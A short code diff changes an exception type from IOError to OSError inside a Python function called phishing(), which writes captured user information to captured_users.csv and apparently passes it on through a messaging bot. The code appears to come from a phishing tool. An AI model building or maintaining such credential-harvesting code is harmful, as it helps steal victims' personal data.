@@ -89,7 +89,7 @@ def phishing():
                     if file.tell() == 0:
                         writer.writeheader()
                     writer.writerow(user_info)
-            except IOError as e:
+            except OSError as e:
                 print(f"{Color.RED}Could not write to captured_users.csv: {e}")
 
             bot.send_message(
